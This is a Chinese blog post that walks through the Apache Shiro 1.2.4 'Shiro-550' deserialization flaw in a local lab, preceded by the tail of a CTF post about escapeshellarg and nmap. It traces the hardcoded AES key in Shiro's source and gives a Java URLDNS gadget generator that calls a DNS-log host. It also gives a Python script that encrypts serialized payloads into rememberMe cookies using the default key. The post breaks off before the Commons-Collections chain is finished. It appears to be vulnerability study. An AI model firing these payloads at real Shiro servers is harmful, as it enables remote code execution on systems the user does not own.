<h2 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h2><p>本来其实是不知道对 <strong>[</strong> <strong>]</strong> <strong>?</strong> 等符号也进行转义之后因为 nmap 写入文件恰好需要那些转义才刚好写进去。自己研究了这么久才意外发现也是很惊喜，之前对namp不甚了解的时候做过[2018BUUCTF]类似的题型，没有完全了解，今天<strong>查阅很多资料+实践</strong>才发现这些奥秘的，希望对你也有帮助。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a> &#x3D;&gt; PHP escapeshellarg()+escapeshellcmd() 之殇</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Tools</category>
      </categories>
  </entry>
  <entry>
    <title>shiro550反序列化</title>
    <url>/2023/03/11/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>JDK：1.7<br>Tomcat：8.5.83<br> shiro源码：下载地址：<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a><br>shiro war包：下载地址<a href="https://github.com/jas502n/SHIRO-550/blob/master/samples-web-1.2.4.war">https://github.com/jas502n/SHIRO-550/blob/master/samples-web-1.2.4.war</a></p>
<p>先看这两个文章：<br><a href="https://www.cnblogs.com/nice0e3/p/14183173.html#:~:text=%E6%9C%AC%E6%96%87%E5%AF%B9%E8%AF%A5Shiro550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%B8%AA%E5%88%86%E6%9E%90%EF%BC%8C%E4%BA%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E3%80%82%200x01%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%20Shiro,550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E7%89%88%E6%9C%AC%EF%BC%9Ashiro%20%3C1.2.4%EF%BC%8C%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%E6%98%AF%E5%9B%A0%E4%B8%BAshiro%E6%8E%A5%E5%8F%97%E4%BA%86Cookie%E9%87%8C%E9%9D%A2%20rememberMe%20%E7%9A%84%E5%80%BC%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8E%BB%E8%BF%9B%E8%A1%8CBase64%E8%A7%A3%E5%AF%86%E5%90%8E%EF%BC%8C%E5%86%8D%E4%BD%BF%E7%94%A8aes%E5%AF%86%E9%92%A5%E8%A7%A3%E5%AF%86%E5%90%8E%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%82">https://www.cnblogs.com/nice0e3/p/14183173.html</a><br><a href="https://blog.csdn.net/m0_67401270/article/details/126721347">https://blog.csdn.net/m0_67401270&#x2F;article&#x2F;details&#x2F;126721347</a></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">坑点：</span><br><span class="line">1.pom.xml包报错其实不用理他</span><br><span class="line">我想要解决这个报错半条解决不掉，结果浪费了好多时间</span><br><span class="line"></span><br><span class="line">2.启动Tomcat的时候要导入的war包用我们刚才下载的那个就可以</span><br></pre></td></tr></table></figure>
<p>然后启动成功的界面就是这样的：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt="image.png"></p>
<h2 id="简单了解流程"><a href="#简单了解流程" class="headerlink" title="简单了解流程"></a>简单了解流程</h2><p>登陆的时候记得按Remember Me<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt="image.png"><br>首先我们抓一个登陆的包：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt="image.png"><br>可以注意到里面有一个rememberMe，思考一下这个rememberMe的内容是什么。<br>我们回到源码里面去分析，直接搜索cookie：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt="image.png"><br>发现有一个<code>CookieRememerMeManager</code>这个类，看名字就知道他多半就是处理<code>RememberMe</code>的逻辑，进去看看：<br>先看他的结构：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt="image.png"><br>有两个方法我我们注意一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="type">byte</span>[] serialized)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//base 64 encode it and store as a cookie:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.encodeToString(serialized);</span><br><span class="line"></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">template</span> <span class="operator">=</span> getCookie(); <span class="comment">//the class attribute is really a template for the outgoing cookies</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCookie</span>(template);</span><br><span class="line">        cookie.setValue(base64);</span><br><span class="line">        cookie.saveTo(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">        <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">        <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">        <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">        <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">            base64 = ensurePadding(base64);</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> decoded;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们查找哪里调用了<code>getRememberedSerializedIdentity</code>：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt="image.png"><br>有一个叫<code>getRememberedPrincipals</code>的方法调用<code>getRememberedSerializedIdentity</code>。看名字就知道<code>getRememberedPrincipals</code>是一个取得Remember验证的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">       <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">           <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">           <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">// 跟进 convertBytesToPrincipals()</span></span><br><span class="line">               principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">           principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> principals;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里我们再跟进<code>convertBytesToPrincipals()</code>,因为<code>convertBytesToPrincipals()</code>就是处理<code>getRememberedSerializedIdentity()</code> 的东西，看名字也猜到就是进行字节转换的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">            bytes = decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这个类就做了两件事情：</p>
<ul>
<li>解码</li>
<li>反序列化</li>
</ul>
<p>我们可以先看反序列化：<br>一路跟进到deserialize：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">        <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            <span class="keyword">return</span> deserialized;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>发现有一个反序列化入口<code>readObject()</code>这里就是我们想要利用的点</p>
<p>那我们回头看解码那个地方他的逻辑是如何的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">        <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">        <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到最关键的就是<code>ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</code>这一句了<br>先看decrypt是什么：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt="image.png"><br>接口的抽象方法，有两个参数<br>第一个是要解密的数据<br>第二个参数就是解密的key了，这个是我们十分关心的，所以我们跟进第二个参数<code>getDecryptionCipherKey()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getDecryptionCipherKey() &#123;</span><br><span class="line">        <span class="keyword">return</span> decryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回<code>decryptionCipherKey</code>那我们就看这个是什么</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDecryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] decryptionCipherKey)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decryptionCipherKey = decryptionCipherKey;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>setDecryptionCipherKey()</code>方法调用了，接着看哪里调用了<code>setDecryptionCipherKey()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">        <span class="comment">//Since this method should only be used in symmetric ciphers</span></span><br><span class="line">        <span class="comment">//(where the enc and dec keys are the same), set it on both:</span></span><br><span class="line">        setEncryptionCipherKey(cipherKey);</span><br><span class="line">        setDecryptionCipherKey(cipherKey);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>看<code>setCipherKey()</code>在哪里被调用了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们跟进<code>DEFAULT_CIPHER_KEY_BYTES</code>，发现<code>DEFAULT_CIPHER_KEY_BYTES</code>确实是个常量：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt="image.png"><br>那就意味着这里是一个固定key加密，我们可以伪造反序列化数据从而达到攻击的目的。</p>
<h2 id="URLDNS链攻击："><a href="#URLDNS链攻击：" class="headerlink" title="URLDNS链攻击："></a>URLDNS链攻击：</h2><p>DNS生成序列化文件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> packet1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLNDS</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://09f42989.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; clazz = url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(url, <span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        field.set(url, -<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用脚本生成payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>生成的payload直接打 ：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt="image.png"><br>记得把前面的<code>JSESSIONID=4917903F4BDDD8CCC8E5BC04BC8006B3;</code>删掉，因为这个也相当于登陆验证，有这个存在就不会关注Cookie的内容了。<br>我们发送数据包后，成功发现发起了DNS请求:<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt="image.png"><br>同理如果shiro项目有CC依赖或者其他可攻击的库就可以造成反序列攻击了</p>
<h2 id="CC3-2-1攻击"><a href="#CC3-2-1攻击" class="headerlink" title="CC3.2.1攻击"></a>CC3.2.1攻击</h2><p>因为默认情况下shiro是没有CC3.2.1的，我们手动导入一下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>导入包之后我们尝试使用CC6攻击一下：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt="image.png"><br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" alt="image.png"><br>发现并没有弹出计算器，我们到IDEA中去看一眼：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" alt="image.png"><br>发现报错了，原因是加载不到Transformer类</p>
<h3 id="为什么加载不到Transformer类？"><a href="#为什么加载不到Transformer类？" class="headerlink" title="为什么加载不到Transformer类？"></a>为什么加载不到Transformer类？</h3><p>我们从入口deserialize入手：<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" alt="image.png"><br>反序列的时候出了问题，肯定就是readObject那里出了问题<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" alt="image.png"><br>跟进到<code>ClassResolvingObjectInputStream</code>这个类里面<br>构造函数是调用父类构造函数就不看了<br>看一下里面重写了一个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">**resolveClass这个方法是Java原生反序列的时候必定会调用的，这里重写了就不会调用Java内置的resolveClass了**</span><br></pre></td></tr></table></figure>

<p>ClassUtils是shiro自己的工具类<br>我们跟进看一下他的forName方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">forName</span><span class="params">(String fqcn)</span> <span class="keyword">throws</span> UnknownClassException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> THREAD_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn +</span><br><span class="line">                        <span class="string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the current ClassLoader.  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Trying the system/application ClassLoader...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the thread context, current, or &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownClassException</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以发现<strong>resolveClass.forName</strong>的类加载全都是用loadClass进行的，但是loadClass无法加载代有数组<br><img src="/./../images/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" alt="image.png"></p>
<h3 id="拼凑CC链攻击"><a href="#拼凑CC链攻击" class="headerlink" title="拼凑CC链攻击"></a>拼凑CC链攻击</h3><p>拼凑的CC链需要满足没有数组的情况，就是终点不能引用<code>Runtime.getRuntime</code>，需要用到defineClass加载恶意类。<br>改写用到CC<br>这一步需要重新复习CC了，鸽一下</p>
